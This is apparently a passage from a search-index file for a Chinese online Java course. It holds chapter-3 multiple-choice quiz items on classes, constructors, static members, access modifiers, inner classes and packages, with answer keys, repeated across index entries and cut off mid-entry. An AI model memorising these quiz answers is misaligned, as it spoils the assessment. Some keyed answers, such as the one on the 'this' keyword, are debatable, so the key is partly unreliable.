\u5728Java\u4e2d\uff0c\u4e00\u4e2a\u7c7b\u53ef\u4ee5\u540c\u65f6\u5b9a\u4e49\u8bb8\u591a\u540c\u540d\u7684\u65b9\u6cd5\uff0c\u8fd9\u4e9b\u65b9\u6cd5\u7684\u5f62\u5f0f\u53c2\u6570\u7684\u4e2a\u6570\u3001\u7c7b\u578b\u6216\u987a\u5e8f\u5404\u4e0d\u76f8\u540c\uff0c\u4f20\u56de\u7684\u503c\u4e5f\u53ef\u4ee5\u4e0d\u76f8\u540c\u3002\u8fd9\u79cd\u9762\u5411\u5bf9\u8c61\u7a0b\u5e8f\u7279\u6027\u79f0\u4e3a\uff1a A. \u9690\u85cf B. \u8986\u76d6 C. \u91cd\u8f7d D. Java\u4e0d\u652f\u6301\u6b64\u7279\u6027 \u89e3\u51b3\u65b9\u6848 C \u4e0b\u9762\u5173\u4e8e\u6784\u9020\u51fd\u6570\u7684\u8bf4\u6cd5\u4e0d\u6b63\u786e\u7684\u662f\uff1a A. \u6784\u9020\u51fd\u6570\u4e5f\u5c5e\u4e8e\u7c7b\u7684\u65b9\u6cd5\uff0c\u7528\u4e8e\u521b\u5efa\u5bf9\u8c61\u7684\u65f6\u5019\u7ed9\u6210\u5458\u53d8\u91cf\u8d4b\u503c\u3002 B. \u6784\u9020\u51fd\u6570\u4e0d\u53ef\u4ee5\u91cd\u8f7d\u3002 C. \u6784\u9020\u51fd\u6570\u6ca1\u6709\u8fd4\u56de\u503c\u3002 D. \u6784\u9020\u51fd\u6570\u4e00\u5b9a\u8981\u548c\u7c7b\u540d\u76f8\u540c \u89e3\u51b3\u65b9\u6848 B \u547d\u4ee4javac -verbose\u4e2d\u9009\u9879\u7684\u4f5c\u7528\u662f: A. \u663e\u793aJVM\u52a0\u8f7dclass\u7684\u8fc7\u7a0b B. \u663e\u793aJVM\u7684\u7248\u672c C. \u663e\u793aJVM\u8c03\u7528\u5185\u5b58\u7684\u60c5\u51b5 D. \u663e\u793aJVM\u7684\u9519\u8bef\u8ddf\u8e2a\u8fc7\u7a0b \u89e3\u51b3\u65b9\u6848 A \u7ed9\u51fa\u7c7b\u7684\u5b9a\u4e49\u5982\u4e0b: 1 2 3 4 5 6 7 8 9 10 11 12 13 class Test { void test ( int i ){ System . out . println ( \"I am an int.\" ); } void test ( String s ){ System . out . println ( \"I am a string.\" ); } public static void main ( String args []) { Test t = new Test (); char ch = 'y' ; t . test ( ch ); } } \u4e0b\u5217\u54ea\u4e2a\u9009\u9879\u6b63\u786e\uff1f A. \u7a0b\u5e8f\u5c06\u4e0d\u4f1a\u7f16\u8bd1\uff0c\u56e0\u4e3a\u7a7a\u7684\u65b9\u6cd5\u4e0d\u80fd\u88ab\u8986\u76d6\u3002 B. \u547d\u4ee4\u884ct.test(ch); \u5c06\u4e0d\u4f1a\u7f16\u8bd1\uff0c\u56e0\u4e3a\u6ca1\u6709\u5bf9\u5e94\u7684\u65b9\u6cd5\u3002 C. \u4ee3\u7801\u5c06\u7f16\u8bd1\u5e76\u8f93\u51fa\u4ee5\u4e0b\u7ed3\u679c\uff1a I am an int. D. \u4ee3\u7801\u5c06\u7f16\u8bd1\u5e76\u8f93\u51fa\u4ee5\u4e0b\u7ed3\u679c\uff1a I am a string. \u89e3\u51b3\u65b9\u6848 C \u7f16\u8bd1\u53ca\u8fd0\u884c\u4ee5\u4e0b\u4ee3\u7801\uff0c\u4e0b\u5217\u9009\u9879\u54ea\u4e2a\u662f\u6b63\u786e\u7684\uff1f 1 2 3 4 5 6 7 8 9 10 11 public class Sandys { private int court ; public static void main ( String argv []){ Sandys s = new Sandys ( 99 ); System . out . println ( s . court ); } Sandys ( int ballcount ){ court = ballcount ; } } A. \u7f16\u8bd1\u9519\u8bef\uff1athe variable court is defined as private B. \u7f16\u8bd1\u9519\u8bef\uff1as is not initialized when the System.out method is called C. \u7f16\u8bd1\u901a\u8fc7\uff0c\u6ca1\u6709\u8f93\u51fa D. \u7f16\u8bd1\u901a\u8fc7\uff0c\u8f93\u51fa99 \u89e3\u51b3\u65b9\u6848 D \u7f16\u8bd1Java Application\u6e90\u7a0b\u5e8f\u6587\u4ef6\u5c06\u4ea7\u751f\u76f8\u5e94\u7684\u5b57\u8282\u7801\u6587\u4ef6\uff0c\u8fd9\u4e9b\u5b57\u8282\u7801\u6587\u4ef6\u7684\u6269\u5c55\u540d\u4e3a A. .java B. .class C. .html D. .exe \u89e3\u51b3\u65b9\u6848 B 3.6 \u7c7b\u65b9\u6cd5/\u53c2\u6570\u4f20\u9012 \u5173\u4e8estatic\u4fee\u9970\u7b26\uff0c\u4ee5\u4e0b\u54ea\u4e2a\u9009\u9879\u662f\u6b63\u786e\u7684\uff1f A. \u88abstatic\u4fee\u9970\u7b26\u4fee\u9970\u7684\u6210\u5458\u53d8\u91cf\u4e0d\u80fd\u88ab\u4fee\u6539\u3002 B. \u5728\u65b9\u6cd5\u4e2d\u521b\u5efa\u7684static\u53d8\u91cf\uff0c\u6bcf\u6b21\u65b9\u6cd5\u8c03\u7528\u4e2d\u5bf9\u5b83\u7684\u503c\u505a\u7684\u4fee\u6539\u90fd\u4e0d\u80fd\u4fdd\u7559\u4e0b\u6765\u3002 C. \u4e00\u4e2a\u7c7b\u7684\u6240\u6709\u7c7b\u5bf9\u8c61\u5171\u4eab\u8fd9\u4e2a\u7c7b\u7684static\u53d8\u91cf\u3002 D. static\u4fee\u9970\u7b26\u53ea\u80fd\u7528\u4e8e\u4fee\u9970\u57fa\u672c\u7c7b\u578b\u53d8\u91cf\u3002 \u89e3\u51b3\u65b9\u6848 C \u4ee5\u4e0b\u5bf9\u65b9\u6cd5\u5185\u7684\u53d8\u91cf\u63cf\u8ff0\u6b63\u786e\u7684\u662f\uff1a A. \u4e00\u5b9a\u5728\u65b9\u6cd5\u5185\u6240\u6709\u4f4d\u7f6e\u53ef\u89c1 B. \u53ef\u80fd\u5728\u65b9\u6cd5\u5185\u5c40\u90e8\u53ef\u89c1 C. \u53ef\u4ee5\u5728\u65b9\u6cd5\u5916\u53ef\u89c1 D. \u65b9\u6cd5\u5916\u4e5f\u53ef\u7528 \u89e3\u51b3\u65b9\u6848 B \u7ed9\u51fa\u5982\u4e0b\u4ee3\u7801: 1 2 3 4 5 6 7 class Test { private int m ; public static void fun () { // some code... \u3000\u3000 } } \u5982\u4f55\u4f7f\u6210\u5458\u53d8\u91cfm\u88ab\u51fd\u6570fun()\u76f4\u63a5\u8bbf\u95ee\uff1f A. \u5c06private int m \u6539\u4e3a protected int m B. \u5c06private int m \u6539\u4e3a public int m C. \u5c06private int m \u6539\u4e3a static int m D. \u5c06private int m \u6539\u4e3a int m \u89e3\u51b3\u65b9\u6848 C \u7c7bJOptionPane\u63d0\u4f9b\u4e86\u51e0\u4e2a\u4ea7\u751f\u6807\u51c6\u5bf9\u8bdd\u6846\u7684\u65b9\u6cd5\uff0c\u5b83\u4eec\u80fd\u591f\u7ed9\u7528\u6237\u63d0\u4f9b\u6709\u7528\u7684\u4fe1\u606f\uff0c\u5176\u4e2d\u5305\u62ec\uff1a A. closeDialog() B. openDialog() C. showInputDialog() D. outputDialog() \u89e3\u51b3\u65b9\u6848 C \u8fd0\u884c\u4e0b\u5217\u7a0b\u5e8f\uff0c\u4f1a\u4ea7\u751f\u4ec0\u4e48\u7ed3\u679c\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import java.io.* ; public class Outer1 { private int a ; void foo ( double d , final float f ){ String s ; final boolean b ; class Inner { void methodInner (){ System . out . println ( \"in the Inner\" ); } } } public static void main ( String args []) { Outer1 me = new Outer1 (); me . foo ( 123 , 123 ); System . out . println ( \"outer\" ); } } A. in the Inner outer B. outer C. in the Inner D. \u7f16\u8bd1\u4e0d\u901a\u8fc7 \u89e3\u51b3\u65b9\u6848 B \u7f16\u8bd1\u53ca\u8fd0\u884c\u4ee5\u4e0b\u4ee3\u7801\uff0c\u4e0b\u5217\u9009\u9879\u54ea\u4e2a\u662f\u6b63\u786e\u7684\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class Ref { public static void main ( String argv []){ Ref r = new Ref (); r . amethod ( r ); } public void amethod ( Ref r ){ int i = 99 ; multi ( r ); System . out . println ( i ); } public void multi ( Ref r ){ r . i = r . i * 2 ; } } A. \u7f16\u8bd1\u9519\u8bef B. \u8f93\u51fa99 C. \u8f93\u51fa198 D. \u8fd0\u884c\u65f6\u51fa\u9519 \u89e3\u51b3\u65b9\u6848 A 3.8 \u8bbf\u95ee\u6743\u9650 this\u5173\u952e\u5b57\u6307\u7684\u662f\uff1f A. \u5f53\u524d\u5bf9\u8c61\u6307\u9488 B. \u5f53\u524d\u7c7b\u7684\u5b9e\u4f8b\u5bf9\u8c61 C. \u5f53\u524d\u5bf9\u8c61\u5f15\u7528 D. \u5f53\u524d\u7c7b\u7684\u65b9\u6cd5 \u89e3\u51b3\u65b9\u6848 B \u5982\u679c\u7c7b\u4e2d\u7684\u6210\u5458\u53d8\u91cf\u4ec5\u4ec5\u53ef\u4ee5\u88ab\u540c\u4e00\u5305\u4e2d\u5176\u4ed6\u7c7b\u8bbf\u95ee\uff0c\u5219\u4f7f\u7528\u5982\u4e0b\u54ea\u4e2a\u7ea6\u675f\u7b26? A. private B. public C. protected D. no modifier \u89e3\u51b3\u65b9\u6848 D \u5982\u679c\u4efb\u4f55\u5305\u4e2d\u7684\u5b50\u7c7b\u90fd\u80fd\u8bbf\u95ee\u8d85\u7c7b\u4e2d\u7684\u6210\u5458\uff0c\u90a3\u4e48\u8d85\u7c7b\u4e2d\u7684\u6210\u5458\u4f7f\u7528\u54ea\u4e2a\u9650\u5b9a\u8bcd\u6700\u597d\uff1f A. public B. private C. protected D. transient \u89e3\u51b3\u65b9\u6848 C \u4e0d\u5141\u8bb8\u4f5c\u4e3a\u7c7b\u53ca\u7c7b\u6210\u5458\u7684\u8bbf\u95ee\u63a7\u5236\u7b26\u7684\u662f: A. public B. private C. static D. protected \u89e3\u51b3\u65b9\u6848 C \u4e0b\u9762\u54ea\u4e2a\u4fee\u9970\u7b26\u4fee\u9970\u7684\u65b9\u6cd5\u53ea\u80fd\u88ab\u672c\u7c7b\u4e2d\u7684\u5176\u4ed6\u65b9\u6cd5\u4f7f\u7528 A. protected B. static C. private D. public \u89e3\u51b3\u65b9\u6848 C \u67d0\u4e2a\u7c7b\u7684\u6210\u5458\u53d8\u91cf\u53ef\u4ee5\u88ab\u540c\u4e00\u4e2a\u5305\u4e2d\u7684\u5b50\u7c7b\u8bbf\u95ee\uff0c\u4f46\u4e0d\u80fd\u88ab\u53e6\u4e00\u4e2a\u5305\u4e2d\u7684\u7c7b\uff08\u542b\u5b50\u7c7b\uff09\u8bbf\u95ee\uff0c\u8be5\u5982\u4f55\u5b9a\u4e49\uff1f A. \u53d8\u91cf\u5e94\u8be5\u7528public\u505a\u4fee\u9970\u3002 B. \u53d8\u91cf\u5e94\u8be5\u7528private\u505a\u4fee\u9970\u3002 C. \u53d8\u91cf\u5e94\u8be5\u7528protected\u505a\u4fee\u9970\u3002 D. \u53d8\u91cf\u4e0d\u9700\u505a\u4efb\u4f55\u4fee\u9970\u3002 \u89e3\u51b3\u65b9\u6848 D \u5173\u4e8e\u88ab\u79c1\u6709\u8bbf\u95ee\u63a7\u5236\u7b26private\u4fee\u9970\u7684\u6210\u5458\u53d8\u91cf\uff0c\u4ee5\u4e0b\u8bf4\u6cd5\u6b63\u786e\u7684\u662f\uff1a A. \u53ef\u4ee5\u88ab\u4e09\u79cd\u7c7b\u6240\u5f15\u7528\uff1a\u8be5\u7c7b\u81ea\u8eab\u3001\u4e0e\u5b83\u5728\u540c\u4e00\u4e2a\u5305\u4e2d\u7684\u5176\u4ed6\u7c7b\u3001\u5728\u5176\u4ed6\u5305\u4e2d\u7684\u8be5\u7c7b\u7684\u5b50\u7c7b B. \u53ef\u4ee5\u88ab\u4e24\u79cd\u7c7b\u8bbf\u95ee\u548c\u5f15\u7528\uff1a\u8be5\u7c7b\u672c\u8eab\u3001\u8be5\u7c7b\u7684\u6240\u6709\u5b50\u7c7b C. \u53ea\u80fd\u88ab\u8be5\u7c7b\u81ea\u8eab\u6240\u8bbf\u95ee\u548c\u4fee\u6539 D. \u53ea\u80fd\u88ab\u540c\u4e00\u4e2a\u5305\u4e2d\u7684\u7c7b\u8bbf\u95ee \u89e3\u51b3\u65b9\u6848 C 3.9 \u5185\u90e8\u7c7b\u7b80\u4ecb \u8003\u8651\u7c7bA: 1 2 3 4 5 6 public class A { public int x = 1 ; public void increaseBy ( int n ){ x = x + n ; } } \u4ee5\u4e0b\u54ea\u4e2a\u9009\u9879\u7a0b\u5e8f\u4ee3\u7801\u6bb5\u4e0d\u4f1a\u8f93\u51fa4\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 A . A a = new A (); a . x = 3 + a . x ; System . out . print ( a . x ); B . A a = new A (); a . increaseBy ( 2 ); a . increaseBy ( 1 ); System . out . print ( a . x ); C . A a = new A (){ public void increaseBy ( int n ) { super . increaseBy ( n ); } }; a . increaseBy ( 4 ); System . out . print ( a . x ); D . A a = new A (); a . increaseBy ( 3 ); System . out . print ( a . x ); \u89e3\u51b3\u65b9\u6848 C 3.10 \u5305\u7684\u5e94\u7528 \u4ee5\u4e0b\u54ea\u51e0\u6bb5\u4ee3\u7801\u53ef\u4ee5\u6210\u529f\u7f16\u8bd1\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 1 ) import java.awt.* ; package Mypackage ; class Myclass {} 2 ) package MyPackage ; import java.awt.* ; class MyClass {} 3 ) /*This is a comment */ package MyPackage ; import java.awt.* ; class MyClass {} A. 1\uff09\u548c2\uff09 B. 2\uff09\u548c3\uff09 C. 1\uff09\u548c3\uff09 D. 1\uff09\u30012\uff09\u548c3\uff09 \u89e3\u51b3\u65b9\u6848 B \u521b\u5efa\u4e00\u4e2a\u540d\u4e3aMyPackage\u5305\u7684\u8bed\u53e5\u6b63\u786e\u7684\u662f\uff1a A. import MyPackage ; B. import package MyPackage ; C. package MyPackage ; D. package import MyPackage ; \u89e3\u51b3\u65b9\u6848 C","title":"3 \u7c7b\u548c\u5bf9\u8c61"},{"location":"uooc/java/3/#32","text":"","title":"3.2 \u7c7b\u7684\u57fa\u672c\u67b6\u6784\u4ecb\u7ecd"},{"location":"uooc/java/3/#_1","text":"A. abstract final class H1{} B. abstract private move(){} C. protected private number; D. public abstract class Car{}","title":"\u4e0b\u5217\u54ea\u4e2a\u7c7b\u58f0\u660e\u662f\u6b63\u786e\u7684\uff1f"},{"location":"uooc/java/3/#_2","text":"D","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#_3","text":"A. \u4eba\u548c\u8001\u864e B. \u4e66\u548c\u6c7d\u8f66 C. \u7236\u4eb2\u548c\u513f\u5b50 D. \u6c7d\u8f66\u548c\u4ea4\u901a\u5de5\u5177","title":"\u4ee5\u4e0b\u9009\u9879\u7b26\u5408\u5bf9\u8c61\u548c\u7c7b\u7684\u5173\u7cfb\u7684\u662f\uff1a"},{"location":"uooc/java/3/#_4","text":"D","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#java","text":"A. \u7c7b\u4f53\u4e2d\u53ea\u80fd\u6709\u53d8\u91cf\u5b9a\u4e49\u3001\u5e38\u91cf\u5b9a\u4e49\u548c\u6210\u5458\u65b9\u6cd5\u7684\u5b9a\u4e49\uff0c\u4e0d\u80fd\u5305\u542b\u201cx=3;\u201d\u8fd9\u6837\u7684\u8bed\u53e5\u3002 B. \u6784\u9020\u51fd\u6570\u662f\u7c7b\u4e2d\u7684\u7279\u6b8a\u65b9\u6cd5 C. \u4e3b\u7c7b\u4e00\u5b9a\u8981\u58f0\u660e\u4e3apublic\u3002 D. \u4e00\u4e2ajava\u6587\u4ef6\u4e2d\u53ef\u4ee5\u6709\u591a\u4e2aclass\u5b9a\u4e49\u3002","title":"\u4e0b\u9762\u5173\u4e8ejava\u4e2d\u7c7b\u7684\u8bf4\u6cd5\u54ea\u4e2a\u662f\u4e0d\u6b63\u786e\u7684\uff1f"},{"location":"uooc/java/3/#_5","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#java_1","text":"A. Float B. this C. string D. unsigned","title":"\u4e0b\u9762\u54ea\u4e2a\u5355\u8bcd\u662fJava\u8bed\u8a00\u7684\u5173\u952e\u5b57\uff1f"},{"location":"uooc/java/3/#_6","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#java_2","text":"A. java.sys\u5305 B. java.lang\u5305 C. java.net\u5305\u3000 D. \u4ee5\u4e0a\u90fd\u4e0d\u662f","title":"\u4e0b\u5217\u54ea\u9879\u662fJava\u7f16\u7a0b\u6240\u5fc5\u987b\u7684\u9ed8\u8ba4\u5f15\u7528\u5305\uff1f"},{"location":"uooc/java/3/#_7","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#java_3","text":"A. NULL B. new C. instanceOf D. wend","title":"\u4ee5\u4e0b\u54ea\u4e2a\u662fJava\u7684\u5173\u952e\u5b57\uff1f"},{"location":"uooc/java/3/#_8","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#java_4","text":"A. 3com B. import C. that D. this","title":"\u4e0b\u9762\u54ea\u4e2a\u662fJava\u8bed\u8a00\u4e2d\u6b63\u786e\u7684\u6807\u8bc6\u7b26\uff1f"},{"location":"uooc/java/3/#_9","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#_10","text":"A. int\u578b B. String\u578b C. \u6570\u7ec4 D. \u4ee5\u4e0a\u90fd\u53ef\u4ee5","title":"\u6570\u7ec4\u4e2d\u53ef\u4ee5\u5305\u542b\u4ec0\u4e48\u7c7b\u578b\u7684\u5143\u7d20\uff1f"},{"location":"uooc/java/3/#_11","text":"D","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#javamain","text":"A. String B. int C. char D. void","title":"\u5728Java\u4e2d\u51fd\u6570main()\u7684\u8fd4\u56de\u503c\u662f\uff1a"},{"location":"uooc/java/3/#_12","text":"D","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#java_5","text":"A. JDK B. J2ME C. J2SE D. J2EE","title":"Java\u5e94\u7528\u5728\u6d88\u8d39\u7535\u5b50\u5e02\u573a\u4e0a\u5f00\u53d1\u5e73\u53f0\u540d\u79f0\u4e3a:"},{"location":"uooc/java/3/#_13","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#34","text":"","title":"3.4 \u4f7f\u7528\u5bf9\u8c61"},{"location":"uooc/java/3/#_14","text":"A. \u7c7b\u5b9a\u4e49\u65f6 B. \u521b\u5efa\u5bf9\u8c61\u65f6 C. \u8c03\u7528\u5bf9\u8c61\u65b9\u6cd5\u65f6 D. \u4f7f\u7528\u5bf9\u8c61\u7684\u53d8\u91cf\u65f6","title":"\u6784\u9020\u65b9\u6cd5\u4f55\u65f6\u88ab\u8c03\u7528\uff1f"},{"location":"uooc/java/3/#_15","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#java-application","text":"A. import java.awt.*; B. import java.applet.Applet; C. import java.io.*; D. import java.awt.Graphis;","title":"\u5728\u7f16\u5199Java Application\u7a0b\u5e8f\u65f6\uff0c\u82e5\u9700\u8981\u4f7f\u7528\u5230\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u8bed\u53e5\uff0c\u5fc5\u987b\u5728\u7a0b\u5e8f\u7684\u5f00\u5934\u5199\u4e0a\u4ee5\u4e0b\u54ea\u6761\u8bed\u53e5\uff1f"},{"location":"uooc/java/3/#_16","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#_17","text":"1 2 3 4 5 6 7 8 9 public class MyClass { public static void main ( String arguments []) { amethod ( arguments ); } public void amethod ( String [] arguments ) { System . out . println ( arguments ); } } A. \u8fd9\u6bb5\u4ee3\u7801\u662f\u9519\u8bef\u7684\uff0cmain\u65b9\u6cd5\u4e0d\u80fd\u63a5\u53d7\u5b57\u7b26\u4e32\u53c2\u6570 B. \u8fd9\u6bb5\u4ee3\u7801\u662f\u9519\u8bef\u7684\uff0camethod\u65b9\u6cd5\u4e2d\u7684\u5b57\u7b26\u4e32\u6570\u7ec4\u5c1a\u672a\u521d\u59cb\u5316 C. \u8fd9\u6bb5\u4ee3\u7801\u662f\u9519\u8bef\u7684\uff0cmain\u65b9\u6cd5\u4e0d\u80fd\u8c03\u7528\u5b9e\u4f8b\u65b9\u6cd5 D. \u8fd9\u6bb5\u4ee3\u7801\u662f\u6b63\u786e\u7684","title":"\u8ba4\u771f\u9605\u8bfb\u4ee3\u7801\uff0c\u9009\u62e9\u6b63\u786e\u7684\u9009\u9879"},{"location":"uooc/java/3/#_18","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#java_6","text":"A. \u9690\u85cf B. \u8986\u76d6 C. \u91cd\u8f7d D. Java\u4e0d\u652f\u6301\u6b64\u7279\u6027","title":"\u5728Java\u4e2d\uff0c\u4e00\u4e2a\u7c7b\u53ef\u4ee5\u540c\u65f6\u5b9a\u4e49\u8bb8\u591a\u540c\u540d\u7684\u65b9\u6cd5\uff0c\u8fd9\u4e9b\u65b9\u6cd5\u7684\u5f62\u5f0f\u53c2\u6570\u7684\u4e2a\u6570\u3001\u7c7b\u578b\u6216\u987a\u5e8f\u5404\u4e0d\u76f8\u540c\uff0c\u4f20\u56de\u7684\u503c\u4e5f\u53ef\u4ee5\u4e0d\u76f8\u540c\u3002\u8fd9\u79cd\u9762\u5411\u5bf9\u8c61\u7a0b\u5e8f\u7279\u6027\u79f0\u4e3a\uff1a"},{"location":"uooc/java/3/#_19","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#_20","text":"A. \u6784\u9020\u51fd\u6570\u4e5f\u5c5e\u4e8e\u7c7b\u7684\u65b9\u6cd5\uff0c\u7528\u4e8e\u521b\u5efa\u5bf9\u8c61\u7684\u65f6\u5019\u7ed9\u6210\u5458\u53d8\u91cf\u8d4b\u503c\u3002 B. \u6784\u9020\u51fd\u6570\u4e0d\u53ef\u4ee5\u91cd\u8f7d\u3002 C. \u6784\u9020\u51fd\u6570\u6ca1\u6709\u8fd4\u56de\u503c\u3002 D. \u6784\u9020\u51fd\u6570\u4e00\u5b9a\u8981\u548c\u7c7b\u540d\u76f8\u540c","title":"\u4e0b\u9762\u5173\u4e8e\u6784\u9020\u51fd\u6570\u7684\u8bf4\u6cd5\u4e0d\u6b63\u786e\u7684\u662f\uff1a"},{"location":"uooc/java/3/#_21","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#javac-verbose","text":"A. \u663e\u793aJVM\u52a0\u8f7dclass\u7684\u8fc7\u7a0b B. \u663e\u793aJVM\u7684\u7248\u672c C. \u663e\u793aJVM\u8c03\u7528\u5185\u5b58\u7684\u60c5\u51b5 D. \u663e\u793aJVM\u7684\u9519\u8bef\u8ddf\u8e2a\u8fc7\u7a0b","title":"\u547d\u4ee4javac  -verbose\u4e2d\u9009\u9879\u7684\u4f5c\u7528\u662f:"},{"location":"uooc/java/3/#_22","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#_23","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 class Test { void test ( int i ){ System . out . println ( \"I am an int.\" ); } void test ( String s ){ System . out . println ( \"I am a string.\" ); } public static void main ( String args []) { Test t = new Test (); char ch = 'y' ; t . test ( ch ); } }","title":"\u7ed9\u51fa\u7c7b\u7684\u5b9a\u4e49\u5982\u4e0b:"},{"location":"uooc/java/3/#_24","text":"A. \u7a0b\u5e8f\u5c06\u4e0d\u4f1a\u7f16\u8bd1\uff0c\u56e0\u4e3a\u7a7a\u7684\u65b9\u6cd5\u4e0d\u80fd\u88ab\u8986\u76d6\u3002 B. \u547d\u4ee4\u884ct.test(ch); \u5c06\u4e0d\u4f1a\u7f16\u8bd1\uff0c\u56e0\u4e3a\u6ca1\u6709\u5bf9\u5e94\u7684\u65b9\u6cd5\u3002 C. \u4ee3\u7801\u5c06\u7f16\u8bd1\u5e76\u8f93\u51fa\u4ee5\u4e0b\u7ed3\u679c\uff1a I am an int. D. \u4ee3\u7801\u5c06\u7f16\u8bd1\u5e76\u8f93\u51fa\u4ee5\u4e0b\u7ed3\u679c\uff1a I am a string.","title":"\u4e0b\u5217\u54ea\u4e2a\u9009\u9879\u6b63\u786e\uff1f"},{"location":"uooc/java/3/#_25","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#_26","text":"1 2 3 4 5 6 7 8 9 10 11 public class Sandys { private int court ; public static void main ( String argv []){ Sandys s = new Sandys ( 99 ); System . out . println ( s . court ); } Sandys ( int ballcount ){ court = ballcount ; } } A. \u7f16\u8bd1\u9519\u8bef\uff1athe variable court is defined as private B. \u7f16\u8bd1\u9519\u8bef\uff1as is not initialized when the System.out method is called C. \u7f16\u8bd1\u901a\u8fc7\uff0c\u6ca1\u6709\u8f93\u51fa D. \u7f16\u8bd1\u901a\u8fc7\uff0c\u8f93\u51fa99","title":"\u7f16\u8bd1\u53ca\u8fd0\u884c\u4ee5\u4e0b\u4ee3\u7801\uff0c\u4e0b\u5217\u9009\u9879\u54ea\u4e2a\u662f\u6b63\u786e\u7684\uff1f"},{"location":"uooc/java/3/#_27","text":"D","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#java-application_1","text":"A. .java B. .class C. .html D. .exe","title":"\u7f16\u8bd1Java Application\u6e90\u7a0b\u5e8f\u6587\u4ef6\u5c06\u4ea7\u751f\u76f8\u5e94\u7684\u5b57\u8282\u7801\u6587\u4ef6\uff0c\u8fd9\u4e9b\u5b57\u8282\u7801\u6587\u4ef6\u7684\u6269\u5c55\u540d\u4e3a"},{"location":"uooc/java/3/#_28","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#36","text":"","title":"3.6 \u7c7b\u65b9\u6cd5/\u53c2\u6570\u4f20\u9012"},{"location":"uooc/java/3/#static","text":"A. \u88abstatic\u4fee\u9970\u7b26\u4fee\u9970\u7684\u6210\u5458\u53d8\u91cf\u4e0d\u80fd\u88ab\u4fee\u6539\u3002 B. \u5728\u65b9\u6cd5\u4e2d\u521b\u5efa\u7684static\u53d8\u91cf\uff0c\u6bcf\u6b21\u65b9\u6cd5\u8c03\u7528\u4e2d\u5bf9\u5b83\u7684\u503c\u505a\u7684\u4fee\u6539\u90fd\u4e0d\u80fd\u4fdd\u7559\u4e0b\u6765\u3002 C. \u4e00\u4e2a\u7c7b\u7684\u6240\u6709\u7c7b\u5bf9\u8c61\u5171\u4eab\u8fd9\u4e2a\u7c7b\u7684static\u53d8\u91cf\u3002 D. static\u4fee\u9970\u7b26\u53ea\u80fd\u7528\u4e8e\u4fee\u9970\u57fa\u672c\u7c7b\u578b\u53d8\u91cf\u3002","title":"\u5173\u4e8estatic\u4fee\u9970\u7b26\uff0c\u4ee5\u4e0b\u54ea\u4e2a\u9009\u9879\u662f\u6b63\u786e\u7684\uff1f"},{"location":"uooc/java/3/#_29","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#_30","text":"A. \u4e00\u5b9a\u5728\u65b9\u6cd5\u5185\u6240\u6709\u4f4d\u7f6e\u53ef\u89c1 B. \u53ef\u80fd\u5728\u65b9\u6cd5\u5185\u5c40\u90e8\u53ef\u89c1 C. \u53ef\u4ee5\u5728\u65b9\u6cd5\u5916\u53ef\u89c1 D. \u65b9\u6cd5\u5916\u4e5f\u53ef\u7528","title":"\u4ee5\u4e0b\u5bf9\u65b9\u6cd5\u5185\u7684\u53d8\u91cf\u63cf\u8ff0\u6b63\u786e\u7684\u662f\uff1a"},{"location":"uooc/java/3/#_31","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#_32","text":"1 2 3 4 5 6 7 class Test { private int m ; public static void fun () { // some code... \u3000\u3000 } }","title":"\u7ed9\u51fa\u5982\u4e0b\u4ee3\u7801:"},{"location":"uooc/java/3/#mfun","text":"A. \u5c06private int m \u6539\u4e3a protected int m B. \u5c06private int m \u6539\u4e3a public int m C. \u5c06private int m \u6539\u4e3a static int m D. \u5c06private int m \u6539\u4e3a int m","title":"\u5982\u4f55\u4f7f\u6210\u5458\u53d8\u91cfm\u88ab\u51fd\u6570fun()\u76f4\u63a5\u8bbf\u95ee\uff1f"},{"location":"uooc/java/3/#_33","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#joptionpane","text":"A. closeDialog() B. openDialog() C. showInputDialog() D. outputDialog()","title":"\u7c7bJOptionPane\u63d0\u4f9b\u4e86\u51e0\u4e2a\u4ea7\u751f\u6807\u51c6\u5bf9\u8bdd\u6846\u7684\u65b9\u6cd5\uff0c\u5b83\u4eec\u80fd\u591f\u7ed9\u7528\u6237\u63d0\u4f9b\u6709\u7528\u7684\u4fe1\u606f\uff0c\u5176\u4e2d\u5305\u62ec\uff1a"},{"location":"uooc/java/3/#_34","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#_35","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import java.io.* ; public class Outer1 { private int a ; void foo ( double d , final float f ){ String s ; final boolean b ; class Inner { void methodInner (){ System . out . println ( \"in the Inner\" ); } } } public static void main ( String args []) { Outer1 me = new Outer1 (); me 